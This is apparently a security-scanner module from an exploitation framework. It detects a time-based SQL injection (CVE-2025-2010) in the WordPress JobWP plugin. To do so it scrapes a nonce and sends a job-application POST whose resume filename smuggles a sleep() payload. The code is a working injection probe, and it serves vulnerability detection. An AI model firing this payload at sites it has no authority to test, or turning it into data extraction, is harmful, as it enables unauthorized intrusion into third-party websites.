#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""JobWP <= 2.3.9 jobwp_upload_resume SQLi (CVE-2025-2010)."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "jobwp"
_VULN_HIGH = (2, 3, 9)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "JobWP CVE-2025-2010 SQLi detect",
        "description": (
            "Time-based SQLi via malicious jobwp_upload_resume filename on job application POST."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-2010",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-2010"],
        "modules": ["auxiliary/admin/http/jobwp_cve_2025_2010_sqli"],
        "tags": ["web", "scanner", "wordpress", "jobwp", "sqli", "cve-2025-2010"],
        "agent": {"approval_required": True},
    }

    base_path = OptString("/", "WordPress base path", required=False)
    job_id = OptString("", "Job post id (auto-discover from /jobs/ links)", required=False)
    sleep_seconds = OptInteger(7, "Sleep duration for time-based probe", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _discover_job_id(self) -> str:
        forced = (self.job_id or "").strip()
        if forced:
            return forced
        for path in ("/jobs/", "/"):
            r = self.http_request(method="GET", path=self._join(path), allow_redirects=True)
            if not r:
                continue
            m = re.search(r"/jobs/(\d+)/", r.text or "")
            if m:
                return m.group(1)
        return ""

    def _probe(self, job_id: str, sleep_s: int) -> float:
        page = self.http_request(method="GET", path=self._join(f"/jobs/{job_id}/"), allow_redirects=True)
        if not page:
            return 0.0
        nonce_m = re.search(r'jobwp_apply_form_nonce_field" value="([a-z0-9]+)"', page.text or "")
        if not nonce_m:
            return 0.0
        boundary = "----KittyJobWP"
        payload_name = f'xxxxxx\\"*sleep({sleep_s})*\\".pdf'
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_apply_form_nonce_field"\r\n\r\n{nonce_m.group(1)}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="x"\r\n\r\n/jobs/{job_id}/\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_apply_for"\r\n\r\nx\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_full_name"\r\n\r\nx\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_email"\r\n\r\nx@x.com\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_cover_letter"\r\n\r\nx\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="jobwp_upload_resume"; filename="{payload_name}"\r\n'
            f"Content-Type: application/pdf\r\n\r\nx\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        start = time.monotonic()
        r = self.http_request(
            method="POST",
            path=self._join(f"/jobs/{job_id}/"),
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            data=body,
            allow_redirects=False,
            timeout=max(int(self.sleep_seconds or 7) + 15, 25),
        )
        elapsed = time.monotonic() - start
        if r and r.status_code == 200 and "jobwp-" in (r.text or ""):
            return elapsed
        return 0.0

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        job_id = self._discover_job_id()
        if not job_id:
            return False
        sleep_s = max(int(self.sleep_seconds or 7), 3)
        delayed = self._probe(job_id, sleep_s)
        if delayed >= sleep_s - 1:
            self.set_info(
                severity="critical",
                reason=f"JobWP CVE-2025-2010 time-based SQLi (~{delayed:.1f}s)",
                path=f"/jobs/{job_id}/",
                cve="CVE-2025-2010",
            )
            return True
        return False
